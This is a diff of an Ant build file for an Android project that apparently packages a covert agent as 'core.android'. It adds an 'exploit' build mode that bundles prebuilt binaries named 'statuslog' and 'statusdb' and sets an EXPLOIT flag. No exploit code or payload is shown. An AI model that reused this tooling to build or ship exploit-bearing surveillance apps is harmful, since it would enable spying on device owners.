@@ -1,38 +1,19 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <project name="android_service" default="help">
 
+	
 	<taskdef resource="net/sf/antcontrib/antlib.xml">
 		<classpath>
 			<pathelement location="antlibs/ant-contrib-1.0b3.jar" />
 		</classpath>
 	</taskdef>
-	
+
 	<taskdef name="iff" classname="net.sf.antcontrib.logic.IfTask" onerror="ignore">
 		<classpath>
 			<pathelement location="antlibs/ant-contrib-1.0b3.jar" />
 		</classpath>
 	</taskdef>
 	
-	<loadproperties srcFile="local.properties" />
-	<property file="ant.properties" />
-	<loadproperties srcFile="project.properties" />
-	<fail message="sdk.dir is missing. Make sure to generate local.properties using 'android update project'" unless="sdk.dir" />
-
-	<!-- version-tag: 2011102401 -->
-	<!-- import file="${sdk.dir}/tools/ant/build.xml" -->
-
-
-	<path id="android.antlibs">
-		<pathelement path="${sdk.dir}/tools/lib/anttasks.jar" />
-		<pathelement path="${sdk.dir}/tools/lib/sdklib.jar" />
-		<pathelement path="${sdk.dir}/tools/lib/androidprefs.jar" />
-	</path>
-
-	<!-- extension targets. Uncomment the ones where you want to do custom work
-	     in between standard targets -->
-	<filterset id="dateFilterSet">
-		<filter token="DATE" value="${TODAY}" />
-	</filterset>
 
 	<taskdef name="crypter" classname="com.example.ant.Crypter">
 		<classpath>
@@ -48,9 +29,35 @@
 				<include name="**/*.zip" />
 			</fileset>
 		</classpath>
-	</taskdef>	
+	</taskdef>
 
-	<target name="salt">
+
+	<loadproperties srcFile="local.properties" />
+	<property file="ant.properties" />
+	<loadproperties srcFile="project.properties" />
+	<property name="ruby.path" value="C:/Ruby193/bin" />
+	<property name="rcscore.path" value="C:/HT/rcs-core-build" />
+	<import file="${sdk.dir}/tools/ant/build.xml" />
+	
+	<fail message="sdk.dir is missing. Make sure to generate local.properties using 'android update project'" unless="sdk.dir" />
+		
+	<!-- version-tag: 2011102401 -->
+	<!-- import file="${sdk.dir}/tools/ant/build.xml" -->
+
+	<path id="android.antlibs">
+		<pathelement path="${sdk.dir}/tools/lib/anttasks.jar" />
+		<pathelement path="${sdk.dir}/tools/lib/sdklib.jar" />
+		<pathelement path="${sdk.dir}/tools/lib/androidprefs.jar" />
+	</path>
+	
+	
+	<!-- extension targets. Uncomment the ones where you want to do custom work
+	     in between standard targets -->
+	<filterset id="dateFilterSet">
+		<filter token="DATE" value="${TODAY}" />
+	</filterset>
+
+	<target name="salt" unless="randomSalt">
 		<random len="8" property="randomSalt">
 		</random>
 		<echo>RandomSalt:${randomSalt}</echo>
@@ -111,42 +118,37 @@
 			<echo message="version: @{version}" />
 			<echo message="kind: @{kind}" />
 
-			<condition property="copybackground">
+			<iff>
 				<and>
-					<equals arg1="@{version}" arg2="2.x" />
+					<equals arg1="@{version}" arg2="v2" />
 					<not>
 						<equals arg1="@{kind}" arg2="debug" />
-
 					</not>
 				</and>
-			</condition>
-
-			<iff>
-				<equals arg1="${foo}" arg2="bar" />
-				<then>
-					<echo message="The value of property foo is bar" />
-				</then>
-				<else>
-					<echo message="The value of property foo is not bar" />
-				</else>
-			</iff>
-
-			<iff>
-				<equals arg1="${foo}" arg2="bar" />
 				<then>
 					<echo message="Copy BackGround" />
+					<copy file="preprocess/AndroidManifest.BACKGROUND.xml" tofile="AndroidManifest.xml" overwrite="true">
+						<filterset>
+							<filter token="CAVEAT" value="QUESTO FILE E' GENERATO DA build.xml. MODIFICATE IL FILE IN PREPROCESS" />
+						</filterset>
+					</copy>
 				</then>
 				<else>
 					<echo message="Copy Activity" />
+					<copy file="preprocess/AndroidManifest.ACTIVITY.xml" tofile="AndroidManifest.xml" overwrite="true">
+						<filterset>
+							<filter token="CAVEAT" value="QUESTO FILE E' GENERATO DA build.xml. MODIFICATE IL FILE IN PREPROCESS" />
+						</filterset>
+					</copy>
 				</else>
 			</iff>
 
 			<switch value="@{kind}">
 				<case value="debug">
 					<echo message="set debug" />
-					<antcall target="libsnoexp" /> recuperare randomSalt
-					<var name="isdebug" value="true"/>
-					<var name="isexploit" value="false"/>
+					<antcall target="libsnoexp" />
+					<var name="isdebug" value="true" />
+					<var name="isexploit" value="false" />
 					<copy file="preprocess/config.debug.bin" toFile="res/raw/config.bin" overwrite="true" />
 					<delete file="assets/statuslog" />
 					<delete file="assets/statusdb" />
@@ -154,8 +156,8 @@
 				<case value="release">
 					<echo message="set release" />
 					<antcall target="libsnoexp" />
-					<var name="isdebug" value="false"/>
-					<var name="isexploit" value="false"/>
+					<var name="isdebug" value="false" />
+					<var name="isexploit" value="false" />
 					<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin" overwrite="true" />
 					<delete file="assets/statuslog" />
 					<delete file="assets/statusdb" />
@@ -163,8 +165,8 @@
 				<case value="exploit">
 					<echo message="set exploit" />
 					<antcall target="libsexp" />
-					<var name="isdebug" value="false"/>
-					<var name="isexploit" value="true"/>
+					<var name="isdebug" value="false" />
+					<var name="isexploit" value="true" />
 					<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin" overwrite="true" />
 					<copy file="libs/armeabi/statuslog" toDir="assets/" overwrite="true" />
 					<copy file="libs/armeabi/statusdb" toDir="assets/" overwrite="true" />
@@ -182,91 +184,12 @@
 					<filter token="KEYS" value="false" />
 					<filter token="FILE" value="true" />
 					<filter token="RANDOM" value="${randomSalt}" />
+					<filter token="VERSION" value="@{version}" />
 				</filterset>
 			</copy>
 
 		</sequential>
 	</macrodef>
-
-	<target name="set-debug" depends="libsnoexp">
-		<echo message="********** Set debug mode *********" />
-		<copy file="preprocess/AndroidManifest.DEBUG.xml" tofile="AndroidManifest.xml" overwrite="true">
-			<filterset>
-				<filter token="CAVEAT" value="QUESTO FILE E' GENERATO DA build.xml. MODIFICATE IL FILE IN PREPROCESS" />
-			</filterset>
-		</copy>
-		<copy file="preprocess/Cfg.java" toFile="src/com/android/service/auto/Cfg.java" overwrite="true">
-			<filterset>
-				<filter token="DEBUG" value="true" />
-				<filter token="EXCEPTION" value="true" />
-				<filter token="EXPLOIT" value="false" />
-				<filter token="DEMO" value="false" />
-				<filter token="KEYS" value="false" />
-				<filter token="FILE" value="true" />
-				<filter token="RANDOM" value="${randomSalt}" />
-			</filterset>
-		</copy>
-		<copy file="preprocess/config.debug.bin" toFile="res/raw/config.bin" overwrite="true" />
-		<copy file="preprocess/resources.bin" toFile="res/raw/resources.bin" overwrite="true" />
-		<delete file="assets/statuslog" />
-		<delete file="assets/statusdb" />
-	</target>
-
-	<target name="set-release" depends="libsnoexp">
-		<echo message="******** Set release mode **********" />
-		<copy file="preprocess/AndroidManifest.RELEASE.xml" tofile="AndroidManifest.xml" overwrite="true">
-			<filterset>
-				<filter token="CAVEAT" value="QUESTO FILE E' GENERATO DA build.xml. MODIFICATE IL FILE IN PREPROCESS" />
-			</filterset>
-		</copy>
-		<copy file="preprocess/Cfg.java" toFile="src/com/android/service/auto/Cfg.java" overwrite="true">
-			<filterset>
-				<filter token="DEBUG" value="false" />
-				<filter token="EXCEPTION" value="false" />
-				<filter token="EXPLOIT" value="false" />
-				<filter token="DEMO" value="false" />
-				<filter token="KEYS" value="false" />
-				<filter token="FILE" value="false" />
-				<filter token="RANDOM" value="${randomSalt}" />
-			</filterset>
-		</copy>
-		<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin" overwrite="true" />
-		<copy file="preprocess/resources.bin" toFile="res/raw/resources.bin" overwrite="true" />
-		<delete file="assets/statuslog" />
-		<delete file="assets/statusdb" />
-	</target>
-
-	<target name="set-exploit" depends="libsexp">
-		<echo message="******** Set exploit mode **********" />
-		<copy file="preprocess/AndroidManifest.DEBUG.xml" tofile="AndroidManifest.xml" overwrite="true">
-			<filterset>
-				<filter token="CAVEAT" value="QUESTO FILE E' GENERATO DA build.xml. MODIFICATE IL FILE IN PREPROCESS" />
-			</filterset>
-		</copy>
-		<copy file="preprocess/Cfg.java" toFile="src/com/android/service/auto/Cfg.java" overwrite="true">
-			<filterset>
-				<filter token="DEBUG" value="true" />
-				<filter token="EXCEPTION" value="true" />
-				<filter token="EXPLOIT" value="true" />
-				<filter token="DEMO" value="true" />
-				<filter token="KEYS" value="false" />
-				<filter token="FILE" value="false" />
-				<filter token="RANDOM" value="${randomSalt}" />
-			</filterset>
-		</copy>
-		<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin" overwrite="true" />
-		<copy file="preprocess/resources.bin" toFile="res/raw/resources.bin" overwrite="true" />
-		<copy file="libs/armeabi/statuslog" toDir="assets/" overwrite="true" />
-		<copy file="libs/armeabi/statusdb" toDir="assets/" overwrite="true" />
-	</target>
-
-	<!--
-		<target name="-pre-build">
-			<echo message="Pre building" />
-		</target>
-		<target name="-pre-compile">
-			<echo message="Pre compile" />
-		</target> -->
 
 	<target name="reverse">
 		<echo message="Reverse" />
@@ -283,24 +206,7 @@
 
 	</target>
 
-	<target name="htdebug" depends="set-debug, debug">
-		<copy file="bin/android_service-debug.apk" toFile="bin/core.android" overwrite="true" />
-		<echo message="bin/core.android" />
-	</target>
-
-	<target name="htrelease" depends="clean, set-release, release">
-		<copy file="bin/android_service-release-unsigned.apk" toFile="bin/core.android" overwrite="true" />
-		<echo message="bin/core.android" />
-	</target>
-
-	<target name="htexploit" depends="clean, set-exploit, release">
-		<echo message="adb uninstall com.android.service" />
-		<echo message="adb install bin/android_service-release.apk" />
-		<copy file="bin/android_service-release-unsigned.apk" toFile="bin/core.android" overwrite="true" />
-		<echo message="bin/core.android" />
-	</target>
-
-	<target name="dist" depends="htrelease">
+	<target name="dist" depends="build">
 		<input message="Version (8.1_RC1)?" addproperty="do.version" defaultvalue="8.1_RC1" />
 		<mkdir dir="../dist/${do.version}" />
 		<copy file="bin/core.android" toDir="../dist/${do.version}" overwrite="true" />
@@ -312,10 +218,6 @@
 		</checksum>
 	</target>
 
-	<import file="${sdk.dir}/tools/ant/build.xml" />
-
-	<property name="ruby.path" value="C:/Ruby193/bin" />
-	<property name="rcscore.path" value="C:/HT/rcs-core-build" />
 
 	<macrodef name="updaterelease">
 		<attribute name="server" />
@@ -357,8 +259,8 @@
 		<echo>ant update : uploads the core to castore</echo>
 	</target>
 
-	<target name="build">
-		<for list="2.x,3.x" param="version">
+	<target name="build" depends="salt">
+		<for list="v2,vdefault" param="version">
 			<sequential>
 				<echo message="==============" />
 				<echo message="===  BUILD === ------------------------------------------------------------" />
@@ -368,27 +270,27 @@
 				<for list="debug,release" param="kind">
 					<sequential>
 						<antcall target="clean" />
-						
+
 						<echo message="bin/@{version}/@{kind}/core.android" />
 						<set-cfg version="@{version}" kind="@{kind}" />
-						<mkdir dir="output/@{version}/@{kind}"/>
-						
+						<mkdir dir="output/@{version}/@{kind}" />
+
 						<iff>
 							<equals arg1="@{kind}" arg2="debug" />
 							<then>
 								<echo message="==============" />
 								<echo>call debug</echo>
-								<antcall target="debug"  inheritAll="false" />
-								<copy file="bin/android_service-debug.apk" toFile="output/@{version}/@{kind}/core.android" overwrite="true" />
+								<antcall target="debug" inheritAll="false" />
+								<copy file="bin/android_service-debug.apk" toFile="output/@{kind}/@{version}/core.android" overwrite="true" />
 							</then>
 							<else>
 								<echo message="==============" />
 								<echo>call release</echo>
 								<antcall target="release" inheritAll="false" />
-								<copy file="bin/android_service-release-unsigned.apk" toFile="output/@{version}/@{kind}/core.android" overwrite="true" />
+								<copy file="bin/android_service-release-unsigned.apk" toFile="output/@{kind}/@{version}/core.android" overwrite="true" />
 							</else>
 						</iff>
-						
+
 					</sequential>
 				</for>
 			</sequential>
